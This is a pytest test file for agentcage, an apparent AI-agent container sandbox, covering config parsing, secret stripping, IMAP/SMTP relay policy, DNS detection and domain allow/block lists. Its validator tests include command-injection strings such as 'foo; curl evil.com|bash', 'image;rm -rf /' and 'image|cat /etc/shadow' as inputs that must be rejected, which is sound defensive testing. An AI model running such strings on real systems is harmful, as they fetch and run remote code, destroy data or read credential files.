"""Tests for agentcage config parsing and validation."""

import os
import textwrap

import pytest

from agentcage.config import Config, ContainerConfig, DomainConfig, LoggingConfig, _host_dns_servers, _RESOLVED_CONF, _VALID_LEVELS, load_config, validate_config


class TestLoadConfigMinimal:
    def test_name(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.name == "test"

    def test_image(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.container.image == "localhost/test:latest"

    def test_defaults(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        cc = cfg.container
        assert cc.user == "1000:1000"
        assert cc.read_only is True
        assert cc.drop_capabilities == ["ALL"]
        assert cc.add_capabilities == []
        assert cc.no_new_privileges is True
        assert cc.security_label_disable is True
        assert cc.restart == "on-failure"
        assert cc.restart_sec == 10
        assert cc.timeout_start_sec == 120
        assert cc.timeout_stop_sec == 30
        assert cc.memory == ""
        assert cc.cpus == ""
        assert cc.command == []
        assert cc.volumes == []
        assert cc.env == {}
        assert cc.named_volumes == {}
        assert cc.tmpfs == []
        assert cc.ports == []
        assert cc.podman_secrets == []

    def test_no_secret_injection(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.secret_injection == []

    def test_default_dns_servers(self, minimal_yaml, monkeypatch):
        monkeypatch.setattr(
            "agentcage.config._host_dns_servers",
            lambda: ["10.0.0.1", "10.0.0.2"],
        )
        cfg = load_config(minimal_yaml)
        assert cfg.dns_servers == ["10.0.0.1", "10.0.0.2"]


class TestLoadConfigFull:
    def test_all_fields(self, full_yaml):
        cfg = load_config(full_yaml)
        assert cfg.name == "myapp"
        cc = cfg.container
        assert cc.image == "node:22-slim"
        assert cc.command == ["node", "/app/agent.js"]
        assert cc.volumes == ["./agent:/app:ro"]
        assert cc.env == {"ANTHROPIC_API_KEY": "${ANTHROPIC_API_KEY}", "STATIC_VAR": "hello"}
        assert cc.named_volumes == {"myapp-data": "/data:rw"}
        assert cc.tmpfs == ["/tmp:rw,noexec,nosuid,size=64M"]
        assert cc.ports == ["127.0.0.1:3000:3000"]
        assert cc.user == ""
        assert cc.memory == "4g"
        assert cc.cpus == "2.0"
        assert cc.read_only is False
        assert cc.drop_capabilities == []
        assert cc.add_capabilities == ["NET_BIND_SERVICE"]
        assert cc.no_new_privileges is False
        assert cc.security_label_disable is False
        assert cc.restart == "no"
        assert cc.restart_sec == 0
        assert cc.timeout_start_sec == 300
        assert cc.timeout_stop_sec == 60

    def test_secret_injection(self, full_yaml):
        cfg = load_config(full_yaml)
        assert len(cfg.secret_injection) == 1
        rule = cfg.secret_injection[0]
        assert rule.env == "INJECTED_KEY"
        assert rule.placeholder == "{{INJECTED_KEY}}"
        assert rule.inject_to == ["api.example.com"]

    def test_injected_secret_removed_from_podman_secrets(self, full_yaml):
        cfg = load_config(full_yaml)
        assert "INJECTED_KEY" not in cfg.container.podman_secrets
        assert "MY_API_KEY" in cfg.container.podman_secrets

    def test_dns_servers(self, full_yaml):
        cfg = load_config(full_yaml)
        assert cfg.dns_servers == ["100.100.100.100", "1.1.1.1"]


class TestLoadConfigSecretInjectionFormats:
    def test_list_format(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            secret_injection:
              - env: KEY1
                placeholder: "{{KEY1}}"
        """))
        cfg = load_config(str(p))
        assert len(cfg.secret_injection) == 1
        assert cfg.secret_injection[0].env == "KEY1"

    def test_dict_with_rules_format(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            secret_injection:
              rules:
                - env: KEY1
                  placeholder: "{{KEY1}}"
                - env: KEY2
                  placeholder: "{{KEY2}}"
                  inject_to:
                    - example.com
        """))
        cfg = load_config(str(p))
        assert len(cfg.secret_injection) == 2
        assert cfg.secret_injection[1].inject_to == ["example.com"]


class TestProtocolRelaysParser:
    def _yaml(self, tmp_path, body):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent(f"""\
            name: test
            container:
              image: test:latest
              podman_secrets:
                - MIGADU_USER
                - MIGADU_PASSWORD
              env:
                MIGADU_PASSWORD: "${{MIGADU_PASSWORD}}"
            {body}
        """))
        return p

    def test_parses_minimal_imap_relay(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: migadu-imap
                type: imap
                listen: "10.89.0.11:1143"
                upstream:
                  host: imap.migadu.com
                  port: 993
                  tls: true
                auth:
                  type: imap-login
                  user_source: "systemd-creds:MIGADU_USER"
                  password_source: "systemd-creds:MIGADU_PASSWORD"
                policy:
                  readonly: true
                  folder_allowlist: [INBOX, Sent]
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        assert len(cfg.protocol_relays) == 1
        relay = cfg.protocol_relays[0]
        assert relay.name == "migadu-imap"
        assert relay.type == "imap"
        assert relay.listen == "10.89.0.11:1143"
        assert relay.upstream.host == "imap.migadu.com"
        assert relay.upstream.port == 993
        assert relay.upstream.tls is True
        assert relay.auth.user_source == "systemd-creds:MIGADU_USER"
        assert relay.auth.password_source == "systemd-creds:MIGADU_PASSWORD"
        assert relay.policy.readonly is True
        assert relay.policy.folder_allowlist == ["INBOX", "Sent"]
        assert relay.policy.conn_rate_limit == "30/min"

    def test_strips_relay_secrets_from_podman_and_env(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: migadu-imap
                type: imap
                listen: "127.0.0.1:1143"
                upstream:
                  host: imap.migadu.com
                  port: 993
                auth:
                  type: imap-login
                  user_source: "systemd-creds:MIGADU_USER"
                  password_source: "systemd-creds:MIGADU_PASSWORD"
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        # Both names must be removed from podman_secrets and env so the
        # cage container never gets the credentials.
        assert "MIGADU_USER" not in cfg.container.podman_secrets
        assert "MIGADU_PASSWORD" not in cfg.container.podman_secrets
        assert "MIGADU_PASSWORD" not in cfg.container.env

    def test_unknown_type_raises(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: bogus
                type: not-a-protocol
                listen: "127.0.0.1:1234"
                upstream:
                  host: example.com
                  port: 1234
        """).replace("\n", "\n            "))
        with pytest.raises(ValueError, match="unknown protocol_relays type"):
            load_config(str(p))

    def test_missing_required_fields_raises(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - type: imap
                listen: "127.0.0.1:1234"
        """).replace("\n", "\n            "))
        with pytest.raises(ValueError, match="requires name/type/listen"):
            load_config(str(p))

    def test_invalid_upstream_port_raises(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: r
                type: imap
                listen: "127.0.0.1:1234"
                upstream:
                  host: example.com
                  port: 0
        """).replace("\n", "\n            "))
        with pytest.raises(ValueError, match="upstream requires"):
            load_config(str(p))

    def test_default_policy(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: r
                type: imap
                listen: "127.0.0.1:1234"
                upstream:
                  host: example.com
                  port: 993
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        relay = cfg.protocol_relays[0]
        assert relay.policy.readonly is False
        assert relay.policy.folder_allowlist == []
        assert relay.policy.conn_rate_limit == "30/min"

    def test_smtp_relay_parses(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: migadu-smtp
                type: smtp
                listen: "0.0.0.0:1025"
                upstream:
                  host: smtp.migadu.com
                  port: 465
                  tls: true
                auth:
                  type: smtp-plain
                  user_source: "podman:MIGADU_USER"
                  password_source: "podman:MIGADU_PASSWORD"
                policy:
                  sender_allowlist: ["jacque@m8i.io"]
                  recipient_allowlist:
                    addresses: ["luca@luca.io"]
                    domains: ["m8i.io"]
                  max_message_bytes: 1048576
                  max_recipients: 5
                  send_rate_limit: "10/hour"
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        relay = cfg.protocol_relays[0]
        assert relay.name == "migadu-smtp"
        assert relay.type == "smtp"
        assert relay.upstream.port == 465
        assert relay.policy.sender_allowlist == ["jacque@m8i.io"]
        assert relay.policy.recipient_allowlist.addresses == ["luca@luca.io"]
        assert relay.policy.recipient_allowlist.domains == ["m8i.io"]
        assert relay.policy.max_message_bytes == 1048576
        assert relay.policy.max_recipients == 5
        assert relay.policy.send_rate_limit == "10/hour"

    def test_smtp_recipient_allowlist_shorthand_list_means_addresses(self, tmp_path):
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: r
                type: smtp
                listen: "127.0.0.1:1025"
                upstream:
                  host: smtp.example.com
                  port: 465
                auth:
                  type: smtp-plain
                  user_source: "podman:U"
                  password_source: "podman:P"
                policy:
                  recipient_allowlist:
                    - bob@example.com
                    - alice@example.com
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        relay = cfg.protocol_relays[0]
        assert relay.policy.recipient_allowlist.addresses == [
            "bob@example.com", "alice@example.com"
        ]

    def test_smtp_strips_relay_secrets_from_cage(self, tmp_path):
        """Same name-stripping behavior we proved for IMAP — secrets
        named in `auth.*_source` are removed from the cage's
        podman_secrets/env so only the proxy holds them."""
        p = self._yaml(tmp_path, textwrap.dedent("""\
            protocol_relays:
              - name: smtp1
                type: smtp
                listen: "127.0.0.1:1025"
                upstream:
                  host: smtp.example.com
                  port: 465
                auth:
                  type: smtp-plain
                  user_source: "podman:MIGADU_USER"
                  password_source: "podman:MIGADU_PASSWORD"
        """).replace("\n", "\n            "))
        cfg = load_config(str(p))
        assert "MIGADU_USER" not in cfg.container.podman_secrets
        assert "MIGADU_PASSWORD" not in cfg.container.podman_secrets


class TestLoadConfigOpenclaw:
    def test_openclaw_config(self, openclaw_yaml):
        cfg = load_config(openclaw_yaml)
        assert cfg.name == "openclaw"
        assert cfg.container.image == "ghcr.io/openclaw/openclaw:latest"
        assert cfg.container.command == ["/usr/local/bin/entrypoint.sh"]
        assert cfg.container.memory == "4g"
        assert cfg.container.cpus == "2.0"
        assert len(cfg.secret_injection) == 1
        assert cfg.secret_injection[0].env == "ANTHROPIC_API_KEY"
        # ANTHROPIC_API_KEY is in secret_injection, not podman_secrets
        assert "ANTHROPIC_API_KEY" not in cfg.container.podman_secrets

    def test_openclaw_podman_secrets_preserved(self, openclaw_yaml):
        cfg = load_config(openclaw_yaml)
        assert "OPENCLAW_GATEWAY_TOKEN" not in cfg.container.podman_secrets
        assert "OPENCLAW_GATEWAY_PASSWORD" in cfg.container.podman_secrets


class TestLoggingConfig:
    def test_defaults_all_false(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.logging.dns_queries is False
        assert cfg.logging.proxy_connections is False
        assert cfg.logging.allowed_requests is False

    def test_explicit_true(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              dns_queries: true
              proxy_connections: true
              allowed_requests: true
        """))
        cfg = load_config(str(p))
        assert cfg.logging.dns_queries is True
        assert cfg.logging.proxy_connections is True
        assert cfg.logging.allowed_requests is True

    def test_legacy_log_allowed_compat(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            log_allowed: true
        """))
        cfg = load_config(str(p))
        assert cfg.logging.allowed_requests is True

    def test_new_key_overrides_legacy(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            log_allowed: true
            logging:
              allowed_requests: false
        """))
        cfg = load_config(str(p))
        assert cfg.logging.allowed_requests is False

    def test_level_default(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.logging.level == "info"
        assert cfg.logging.dns == ""
        assert cfg.logging.proxy == ""
        assert cfg.logging.cage == ""

    def test_level_explicit(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              level: warning
              dns: error
              proxy: debug
        """))
        cfg = load_config(str(p))
        assert cfg.logging.level == "warning"
        assert cfg.logging.dns == "error"
        assert cfg.logging.proxy == "debug"
        assert cfg.logging.cage == ""

    def test_level_for_fallback(self):
        lc = LoggingConfig(level="warning", dns="error")
        assert lc.level_for("dns") == "error"
        assert lc.level_for("proxy") == "warning"
        assert lc.level_for("cage") == "warning"

    def test_level_for_all_set(self):
        lc = LoggingConfig(level="info", dns="debug", proxy="warning", cage="error")
        assert lc.level_for("dns") == "debug"
        assert lc.level_for("proxy") == "warning"
        assert lc.level_for("cage") == "error"


class TestValidateLoggingLevels:
    def test_invalid_global_level(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              level: trace
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="logging.level"):
            validate_config(cfg)

    def test_invalid_service_level(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              dns: verbose
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="logging.dns"):
            validate_config(cfg)

    def test_valid_levels_pass(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            logging:
              level: debug
              dns: warning
              proxy: error
              cage: info
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert warnings == []


class TestLoadConfigEdgeCases:
    def test_empty_file(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text("")
        cfg = load_config(str(p))
        assert cfg.name == ""

    def test_drop_capabilities_string(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              drop_capabilities: NET_RAW
        """))
        cfg = load_config(str(p))
        assert cfg.container.drop_capabilities == ["NET_RAW"]


class TestValidateConfig:
    def test_valid_config(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        warnings = validate_config(cfg)
        assert warnings == []

    def test_missing_name(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text("container:\n  image: test:latest\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="name"):
            validate_config(cfg)

    @pytest.mark.parametrize("bad_name", [
        "foo; curl evil.com|bash",
        "foo$(id)",
        "foo`id`",
        "Uppercase",
        "-starts-with-dash",
        "has spaces",
        "has_underscores",
        "a" * 64,  # too long
    ])
    def test_rejects_invalid_name(self, tmp_path, bad_name):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: '{bad_name}'\ncontainer:\n  image: x\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="name"):
            validate_config(cfg)

    @pytest.mark.parametrize("good_name", [
        "myapp",
        "my-app",
        "a",
        "test123",
        "a" * 63,
    ])
    def test_accepts_valid_name(self, tmp_path, good_name):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: '{good_name}'\ncontainer:\n  image: x\n")
        cfg = load_config(str(p))
        validate_config(cfg)  # should not raise

    def test_missing_image(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text("name: test\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="image"):
            validate_config(cfg)

    @pytest.mark.parametrize("good_image", [
        "ubuntu:24.04",
        "docker.io/library/ubuntu:latest",
        "ghcr.io/org/repo:tag",
        "registry.example.com:5000/path/image",
        "localhost/test:latest",
        "node:22-slim",
        "myimage",
        "my-repo/my-image:v1.2.3",
        "registry.example.com:5000/path/image@sha256:" + "a" * 64,
    ])
    def test_accepts_valid_image(self, tmp_path, good_image):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: test\ncontainer:\n  image: '{good_image}'\n")
        cfg = load_config(str(p))
        validate_config(cfg)  # should not raise

    @pytest.mark.parametrize("bad_image", [
        "ubuntu latest",          # whitespace
        "image;rm -rf /",         # shell metacharacter
        "image$(id)",             # command substitution
        "image`id`",              # backtick injection
        "../../../etc/passwd",    # path traversal (starts with .)
        "image|cat /etc/shadow",  # pipe injection
        "image&bg",               # background operator
        " leading-space",         # leading whitespace
    ])
    def test_rejects_invalid_image(self, tmp_path, bad_image):
        p = tmp_path / "config.yaml"
        p.write_text(f"name: test\ncontainer:\n  image: '{bad_image}'\n")
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="invalid container image reference"):
            validate_config(cfg)

    def test_warns_unset_env_var(self, tmp_path, monkeypatch):
        monkeypatch.delenv("NONEXISTENT_VAR_12345", raising=False)
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              env:
                MY_KEY: "${NONEXISTENT_VAR_12345}"
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert any("NONEXISTENT_VAR_12345" in w for w in warnings)

    def test_no_warn_for_set_env_var(self, tmp_path, monkeypatch):
        monkeypatch.setenv("EXISTING_VAR_TEST", "value")
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
              env:
                MY_KEY: "${EXISTING_VAR_TEST}"
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert warnings == []


class TestHostDnsServers:
    def _patch_resolv(self, monkeypatch, tmp_path, etc_text, resolved_text=None):
        """Mock /etc/resolv.conf and optionally _RESOLVED_CONF."""
        etc_file = tmp_path / "etc-resolv.conf"
        etc_file.write_text(etc_text)
        resolved_file = None
        if resolved_text is not None:
            resolved_file = tmp_path / "resolved-resolv.conf"
            resolved_file.write_text(resolved_text)
        _real_open = open

        def _fake_open(path, *a, **kw):
            if path == "/etc/resolv.conf":
                return _real_open(str(etc_file), *a, **kw)
            if path == _RESOLVED_CONF and resolved_file is not None:
                return _real_open(str(resolved_file), *a, **kw)
            if path == _RESOLVED_CONF:
                raise OSError("No such file")
            return _real_open(path, *a, **kw)

        monkeypatch.setattr("builtins.open", _fake_open)

    def test_parses_resolv_conf(self, tmp_path, monkeypatch):
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="# comment\nnameserver 100.100.100.100\nnameserver 1.1.1.1\nsearch local\n",
        )
        assert _host_dns_servers() == ["100.100.100.100", "1.1.1.1"]

    def test_empty_resolv_conf_raises(self, tmp_path, monkeypatch):
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="# no nameservers here\nsearch local\n",
        )
        with pytest.raises(RuntimeError, match="Could not detect usable DNS"):
            _host_dns_servers()

    def test_missing_resolv_conf_raises(self, tmp_path, monkeypatch):
        _real_open = open
        def _fake_open(path, *a, **kw):
            if path in ("/etc/resolv.conf", _RESOLVED_CONF):
                raise OSError("No such file")
            return _real_open(path, *a, **kw)
        monkeypatch.setattr("builtins.open", _fake_open)
        with pytest.raises(RuntimeError, match="Could not detect usable DNS"):
            _host_dns_servers()

    def test_systemd_resolved_uses_upstream(self, tmp_path, monkeypatch):
        """When /etc/resolv.conf has only 127.0.0.53, read real upstreams."""
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="nameserver 127.0.0.53\noptions edns0\n",
            resolved_text="nameserver 192.168.1.1\n",
        )
        assert _host_dns_servers() == ["192.168.1.1"]

    def test_loopback_no_resolved_raises(self, tmp_path, monkeypatch):
        """All loopback + no systemd-resolved file → error."""
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="nameserver 127.0.0.53\noptions edns0\n",
        )
        with pytest.raises(RuntimeError, match="Set dns_servers explicitly"):
            _host_dns_servers()

    def test_filters_loopback_keeps_real_servers(self, tmp_path, monkeypatch):
        """Loopback entries are dropped but real servers are kept."""
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text=(
                "nameserver 127.0.0.1\n"
                "nameserver 9.9.9.9\n"
                "nameserver 127.0.0.53\n"
                "nameserver 8.8.4.4\n"
            ),
        )
        assert _host_dns_servers() == ["9.9.9.9", "8.8.4.4"]

    def test_filters_ipv6_loopback(self, tmp_path, monkeypatch):
        self._patch_resolv(
            monkeypatch, tmp_path,
            etc_text="nameserver ::1\n",
        )
        with pytest.raises(RuntimeError, match="Could not detect usable DNS"):
            _host_dns_servers()


class TestDomainConfigNewFormat:
    def test_allow_list(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - github.com
                - pypi.org
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == "allowlist"
        assert cfg.domains.allow == ["github.com", "pypi.org"]
        assert cfg.domains.list == ["github.com", "pypi.org"]
        assert cfg.domains.block == []
        assert cfg.domains.passthrough == []

    def test_block_list(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              block:
                - evil.com
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == "blocklist"
        assert cfg.domains.block == ["evil.com"]
        assert cfg.domains.list == ["evil.com"]
        assert cfg.domains.allow == []

    def test_passthrough(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - anthropic.com
                - whatsapp.com
              passthrough:
                - whatsapp.com
        """))
        cfg = load_config(str(p))
        assert cfg.domains.passthrough == ["whatsapp.com"]
        assert cfg.domains.allow == ["anthropic.com", "whatsapp.com"]
        assert cfg.domains.mode == "allowlist"

    def test_passthrough_default_empty(self, minimal_yaml):
        cfg = load_config(minimal_yaml)
        assert cfg.domains.passthrough == []

    def test_backward_compat_mode_allowlist(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              mode: allowlist
              list:
                - github.com
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == "allowlist"
        assert cfg.domains.allow == ["github.com"]
        assert cfg.domains.list == ["github.com"]

    def test_backward_compat_mode_blocklist(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              mode: blocklist
              list:
                - evil.com
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == "blocklist"
        assert cfg.domains.block == ["evil.com"]
        assert cfg.domains.list == ["evil.com"]

    def test_no_domains_section(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
        """))
        cfg = load_config(str(p))
        assert cfg.domains.mode == ""
        assert cfg.domains.allow == []
        assert cfg.domains.block == []
        assert cfg.domains.passthrough == []
        assert cfg.domains.list == []

    def test_validation_allow_and_block_error(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - good.com
              block:
                - bad.com
        """))
        cfg = load_config(str(p))
        with pytest.raises(ValueError, match="cannot specify both"):
            validate_config(cfg)

    def test_validation_passthrough_warning(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - anthropic.com
              passthrough:
                - whatsapp.com
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        assert any("passthrough bypasses TLS" in w for w in warnings)
        assert any("whatsapp.com" in w and "not in the allow list" in w for w in warnings)

    def test_validation_passthrough_covered(self, tmp_path):
        p = tmp_path / "config.yaml"
        p.write_text(textwrap.dedent("""\
            name: test
            container:
              image: test:latest
            domains:
              allow:
                - anthropic.com
                - whatsapp.com
              passthrough:
                - whatsapp.com
        """))
        cfg = load_config(str(p))
        warnings = validate_config(cfg)
        # Should warn about passthrough but NOT about uncovered domain
        assert any("passthrough bypasses TLS" in w for w in warnings)
        assert not any("not in the allow list" in w for w in warnings)
